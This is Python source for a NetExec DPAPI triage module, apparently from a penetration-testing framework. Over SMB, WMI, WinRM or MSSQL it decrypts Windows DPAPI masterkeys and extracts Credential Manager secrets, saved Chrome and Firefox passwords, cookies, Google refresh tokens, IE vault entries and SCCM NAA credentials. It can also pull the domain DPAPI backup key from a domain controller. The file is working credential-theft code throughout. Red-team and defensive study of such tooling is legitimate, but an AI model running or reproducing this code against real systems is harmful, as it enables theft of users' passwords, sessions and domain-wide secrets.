
from dploot.lib.network.smb import SMBTarget, DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.backupkey import BackupkeyTriage
from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken, Cookie
from dploot.triage.cng import CngTriage
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file, Masterkey
from dploot.triage.sccm import SCCMTriage, SCCMCred, SCCMSecret, SCCMCollection
from dploot.triage.vaults import VaultsTriage

from nxc.helpers.firefox import FirefoxCookie, FirefoxData, FirefoxTriage
from nxc.helpers.logger import highlight


def upgrade_to_dploot_connection(target, context=None):
    """
    DPLootConnection classes implements a whole lot of stuff to handle the DPAPI part.
    This function gets the calling NXC protocol and tries reuse the already opened connection
    on DPLoot directly. If not it opens up a new connection.
    """
    conn = None
    protocol = target.protocol
    try:
        match protocol:
            case "smb":
                from dploot.lib.network.smb import DPLootSMBConnection
                conn = DPLootSMBConnection(target)
                if context is not None:
                    conn.smb_session = context.conn
                else:
                    conn.connect()
            case "wmi":
                from dploot.lib.network.wmi import DPLootWMIConnection
                conn = DPLootWMIConnection(target)
                if context is not None:
                    conn.dcom = context.dcom_conn
                    conn.iWbemLevel1Login = context.iWbemLevel1Login
                else:
                    conn.connect()
            case "winrm":
                from dploot.lib.network.winrm import DPLootWINRMConnection
                conn = DPLootWINRMConnection(target)
                if context is not None:
                    conn.conn = context.conn
                else:
                    conn.connect()
            case "mssql":
                from dploot.lib.network.mssql import DPLootMSSQLConnection
                conn = DPLootMSSQLConnection(target)
                if context is not None:
                    conn.conn = context.conn
    except Exception as e:
        print(e)
        return None

    return conn


class DPAPITriage:
    """
    DPAPI engine in NetExec. Each protocol supporting DPAPI needs to implement this class.
    Since multiple NXC functionalities now implements DPAPI related secret recovery, this class aims to centralize
    it in order to ease implemented and maintaining DPAPI functionalities is NXC protocols, but also
    to avoid dumping masterkeys X times from the same target, loading the domain backup keys X times, etc.

    To implement this class in a protocol, use a @property decorator on dpapi_triage like so:

    ```
    @property
    def dpapi_triage(self) -> DPAPITriage:
        if self._dpapi_triage is not None:
            return self._dpapi_triage
        target = <dploot target creation>

        self._dpapi_triage = DPAPITriage(self, target)
        return self._dpapi_triage
    ```

    This way, every DPAPI related module will automaticaly work with the protocol

    """
    def __init__(self, context, target: Target):
        self.context = context
        self.target = target

        self.conn = None
        self.dump_cookies = False
        self.masterkeys = []
        self._pvkbytes = None

        if context.args.dpapi is not None:
            self.dump_cookies = "cookies" in context.args.dpapi

        # Variables to know what materkey types have already been dumped
        self.system_masterkeys_already_dumped = False
        self.users_masterkeys_already_dumped = False

        # Initialize the connection here, if you need this class then you will need the connection
        self.init_connection()

    def init_connection(self):
        """Tries to initiate a DPLootConnection object from a NXC connection"""
        if self.conn is not None:
            self.context.logger.debug("DPLoot connection already initiated, skipping.")
            return
        self.conn = upgrade_to_dploot_connection(context=self.context, target=self.target)
        if self.conn is None:
            self.context.logger.fail("Could not upgrade connection to allow DPAPI triage")
            return

    def collect_masterkeys_from_target(self, dump_users: True, dump_system: False):
        """
        Get and decrypt masterkeys from the target.
        dump_users: If True, then user masterkeys will be collected if they have not already been
        dump_system: If True, then system masterkeys will be collected if they have not already been
        """
        # If we have already dumped everything, then we won't find new stuff
        if self.users_masterkeys_already_dumped and self.system_masterkeys_already_dumped:
            return self.masterkeys

        masterkeys = []
        plaintexts = {}
        nthashes = {}

        # First, check and handle the mkfile arg
        if self.context.args.mkfile is not None:
            try:
                masterkeys += parse_masterkey_file(self.context.args.mkfile)
            except Exception as e:
                self.context.logger.fail(str(e))

        # Then, use nxcdb to fill wordlists, this can help to decrypt some masterkeys
        if dump_users:
            plaintexts = {username: password for _, _, username, password, _, _ in self.context.db.get_credentials(cred_type="plaintext")}
            nthashes = {username: nt.split(":")[1] if ":" in nt else nt for _, _, username, nt, _, _ in self.context.db.get_credentials(cred_type="hash")}
            # dploot matches user.lower()
            if self.context.password != "":
                plaintexts[self.context.username.lower()] = self.context.password
            if self.context.nthash != "":
                nthashes[self.context.username.lower()] = self.context.nthash

        # Now prepare the SYSTEM part
        if (dump_system
            and self.context.dpapi_system_key is None
            and hasattr(self.context, "lsa")
            and callable(self.context.lsa)):
            # We can use the protocol specific LSA dump if not already dumped.
            # But first, just making sure the protocol supports LSA dump :)
            self.context.lsa()

        # Invoke MasterkeyTriage class
        try:
            masterkeys_triage = MasterkeysTriage(
                target=self.target,
                conn=self.conn,
                pvkbytes=self.pvkbytes,
                passwords=plaintexts,
                nthashes=nthashes,
                dpapiSystem=self.context.dpapi_system_key,
            )
            self.context.logger.debug(f"Masterkeys Triage: {masterkeys_triage}")

            # Collect User Masterkeys if this has not already been done
            if dump_users and not self.users_masterkeys_already_dumped:
                self.context.logger.display("Collecting DPAPI Users masterkeys")
                masterkeys += masterkeys_triage.triage_masterkeys()
                # if multiple functionalities are calling masterkeys triage, make sur we do it only once
                self.users_masterkeys_already_dumped = True

            # Collect SYSTEM Masterkeys if this has not already been done
            if self.context.dpapi_system_key is not None and not self.system_masterkeys_already_dumped:
                self.context.logger.display("Collecting DPAPI SYSTEM masterkeys")
                masterkeys += masterkeys_triage.triage_system_masterkeys()
                # if multiple functionalities are calling masterkeys triage, make sur we do it only once
                self.system_masterkeys_already_dumped = True
        except Exception as e:
            self.context.logger.debug(f"Could not get masterkeys: {e}")
        self.masterkeys += masterkeys
        # If we decrypted new masterkeys, print the message
        if len(masterkeys) > 0:
            self.context.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. ")
        return self.masterkeys

    def triage_credentials(self, masterkeys: list[Masterkey]):
        # Collect User and Machine Credentials Manager secrets

        def credential_callback(credential):
            tag = "CREDENTIAL"
            line = f"[{credential.winuser}][{tag}] {credential.target} - {credential.username}:{credential.password}"
            self.context.logger.highlight(line)
            if self.output_file:
                self.output_file.write(line + "\n")
            self.context.db.add_dpapi_secrets(
                self.target.address,
                tag,
                credential.winuser,
                credential.username,
                credential.password,
                credential.target,
            )

        try:
            credentials_triage = CredentialsTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_credential_callback=credential_callback)
            self.context.logger.debug(f"Credentials Triage Object: {credentials_triage}")
            secrets = credentials_triage.triage_credentials()
            secrets += credentials_triage.triage_system_credentials()
        except Exception as e:
            self.context.logger.debug(f"Error while looting credentials: {e}")
        return len(secrets)

    def triage_chromium(self, masterkeys: list[Masterkey]):
        cng_chromekey = None
        # We need the CNG triage to recover Chrome passwords since Chrome v137
        try:
            cng_triage = CngTriage(target=self.target, conn=self.conn, masterkeys=masterkeys)
            for cng_file in cng_triage.triage_system_cng():
                if cng_file.cng_blob["Name"].decode("utf-16le").rstrip("\0") == "Google Chromekey1":
                    self.context.logger.debug("Found CNG Google ChromeKey1\n")
                    cng_chromekey = cng_file.decrypted_private_key
        except Exception as e:
            self.context.logger.debug(f"Error while getting CNG ChromeKey1: {e}")

        # Collect Chrome Based Browser stored secrets
        def browser_callback(secret):
            if isinstance(secret, LoginData):
                secret_url = secret.url + " -" if secret.url != "" else "-"
                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret_url} {secret.username}:{secret.password}"
                self.context.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    secret.browser.upper(),
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.url,
                )
            elif isinstance(secret, GoogleRefreshToken):
                line = f"[{secret.winuser}][{secret.browser.upper()}] Google Refresh Token: {secret.service}:{secret.token}"
                self.context.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    secret.browser.upper(),
                    secret.winuser,
                    secret.service,
                    secret.token,
                    "Google Refresh Token",
                )
            elif isinstance(secret, Cookie):
                line = f"[{secret.winuser}][{secret.browser.upper()}] {secret.host}{secret.path} - {secret.cookie_name}:{secret.cookie_value}"
                self.context.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")

        try:
            browser_triage = BrowserTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_secret_callback=browser_callback)
            secrets = browser_triage.triage_browsers(gather_cookies=self.dump_cookies, cng_chromekey=cng_chromekey)
        except Exception as e:
            self.context.logger.debug(f"Error while looting browsers: {e}")

        return len(secrets[0])

    def triage_vaults(self, masterkeys: list[Masterkey]):
        def vault_callback(secret):
            tag = "IEX"
            if secret.type == "Internet Explorer":
                resource = secret.resource + " -" if secret.resource != "" else "-"
                line = f"[{secret.winuser}][{tag}] {resource} - {secret.username}:{secret.password}"
                self.context.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    tag,
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.resource,
                )

        try:
            # Collect User Internet Explorer stored secrets
            vaults_triage = VaultsTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_vault_callback=vault_callback)
            secrets = vaults_triage.triage_vaults()
        except Exception as e:
            self.context.logger.debug(f"Error while looting vaults: {e}")

        return len(secrets)

    def triage_firefox(self):
        def firefox_callback(secret):
            tag = "FIREFOX"
            if isinstance(secret, FirefoxData):
                url = secret.url + " -" if secret.url != "" else "-"
                line = f"[{secret.winuser}][{tag}] {url} {secret.username}:{secret.password}"
                self.context.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    tag,
                    secret.winuser,
                    secret.username,
                    secret.password,
                    secret.url,
                )
            elif isinstance(secret, FirefoxCookie):
                line = f"[{secret.winuser}][{tag}] {secret.host}{secret.path} {secret.cookie_name}:{secret.cookie_value}"
                self.context.logger.highlight(line)
                if self.output_file:
                    self.output_file.write(line + "\n")

        try:
            # Collect Firefox stored secrets
            firefox_triage = FirefoxTriage(target=self.target, logger=self.context.logger, conn=self.conn, per_secret_callback=firefox_callback)
            secrets = firefox_triage.run(gather_cookies=self.dump_cookies)
        except Exception as e:
            self.logger.debug(f"Error while looting firefox: {e}")

        return len(secrets)

    # The dpapi function for every protocol
    def triage_dpapi(self):
        # Get the handle of the output file, this will be use by every triage functions to write looted secrets in there
        self.output_file = open(self.context.output_file_template.format(output_folder="dpapi"), "w", encoding="utf-8")  # noqa: SIM115

        # Load masterkeys
        masterkeys = self.collect_masterkeys_from_target(dump_users=True, dump_system="nosystem" not in self.context.args.dpapi)
        if len(masterkeys) == 0:
            # Nothing will be recovered if no masterkeys, so we can stop there
            self.context.logger.fail("No masterkeys looted")
            return

        self.context.logger.success("Looting secrets...")

        # Keeping a counter to know how it went
        counter = 0

        # Calling all the triage functions. We can add other triage functions here
        counter += self.triage_credentials(masterkeys)
        counter += self.triage_chromium(masterkeys)
        counter += self.triage_vaults(masterkeys)
        counter += self.triage_firefox()

        # If the output file is still opened, the gently close it.
        if self.output_file:
            self.output_file.close()

        # If no secrets recovered, then we still tell the user
        if counter == 0:
            self.context.logger.fail("No DPAPI secrets retrieved")
        else:
            self.context.logger.success(f"{counter} DPAPI secrets retrieved")

    def triage_sccm(self):
        masterkeys = self.collect_masterkeys_from_target(dump_users=False, dump_system=True)
        if len(masterkeys) == 0:
            self.context.logger.fail("No masterkeys looted")
            return

        self.context.logger.success("Looting SCCM Credentials")

        def sccm_callback(secret):
            if isinstance(secret, SCCMCred):
                tag = "NAA Account"
                self.context.logger.highlight(f"[{tag}] {secret.username.decode('latin-1')}:{secret.password.decode('latin-1')}")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    f"SCCM - {tag}",
                    "SYSTEM",
                    secret.username.decode("latin-1"),
                    secret.password.decode("latin-1"),
                    "N/A",
                )
            elif isinstance(secret, SCCMSecret):
                tag = "Task sequences secret"
                self.context.logger.highlight(f"[{tag}] {secret.secret.decode('latin-1')}")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    f"SCCM - {tag}",
                    "SYSTEM",
                    "N/A",
                    secret.secret.decode("latin-1"),
                    "N/A",
                )
            elif isinstance(secret, SCCMCollection):
                tag = "Collection Variable"
                self.context.logger.highlight(f"[{tag}] {secret.variable.decode('latin-1')}:{secret.value.decode('latin-1')}")
                self.context.db.add_dpapi_secrets(
                    self.target.address,
                    f"SCCM - {tag}",
                    "SYSTEM",
                    secret.variable.decode("latin-1"),
                    secret.value.decode("latin-1"),
                    "N/A",
                )
        try:
            sccm_triage = SCCMTriage(target=self.target, conn=self.conn, masterkeys=masterkeys, per_secret_callback=sccm_callback)
            sccm_triage.triage_sccm()
        except Exception as e:
            self.logger.debug(f"Error while looting sccm: {e}")

    @property
    def pvkbytes(self):
        """
        The pvkbytes. If not already initialized, tries to set it
        The precedence order is the following :
        - Check the pvk argument
        - Checks in the DB
        - Get it from a domain controller
        """
        # pvkbytes already loaded and in cache ? Serve it
        if self._pvkbytes is not None:
            return self._pvkbytes

        pvkbytes = None

        # First check the pvk argument and handle it
        if hasattr(self.context.args, "pvk") and self.context.args.pvk is not None:
            try:
                with open(self.context.args.pvk, "rb") as fd:
                    pvkbytes = fd.read()
                self.context.logger.success(f"Loading domain backupkey from {self.context.args.pvk}")
            except Exception as e:
                self.context.logger.fail(str(e))

        # If no pvkbytes yet, then we check in the DB
        if pvkbytes is None:
            try:
                results = self.context.db.get_domain_backupkey(self.context.domain)
            except Exception:
                self.context.logger.fail("Your version of nxcdb is not up to date, run nxcdb and create a new workspace: 'workspace create dpapi' then re-run the dpapi option")
                return False
            if len(results) > 0:
                self.context.logger.success("Loading domain backupkey from nxcdb...")
                pvkbytes = results[0][2]

        # If no pvkbytes yet, then we can try to get it from a domain controller
        if pvkbytes is None and self.context.no_da is None and self.context.args.local_auth is False:
            try:
                dc_target = SMBTarget.create(
                    domain=self.context.domain,
                    username=self.context.username,
                    password=self.context.password,
                    address=self.context.kdcHost if self.context.kdcHost is not None and self.context.kdcHost != "" else self.context.domain,  # querying DNS server for domain will return DC
                    lmhash=self.context.lmhash,
                    nthash=self.context.nthash,
                    do_kerberos=self.context.kerberos,
                    aesKey=self.context.aesKey,
                    use_kcache=self.context.use_kcache,
                )
                dc_conn = DPLootSMBConnection(dc_target)
                dc_conn.connect()  # Connect to DC
                if dc_conn.is_admin():
                    self.context.logger.success("User is Domain Administrator, exporting domain backupkey...")
                    backupkey_triage = BackupkeyTriage(target=dc_target, conn=dc_conn)
                    backupkey = backupkey_triage.triage_backupkey()
                    pvkbytes = backupkey.backupkey_v2
                    self.context.db.add_domain_backupkey(self.context.domain, pvkbytes)
                else:
                    self.context.no_da = False
            except Exception as e:
                self.context.logger.fail(f"Could not get domain backupkey: {e}")

        self._pvkbytes = pvkbytes
        return self._pvkbytes
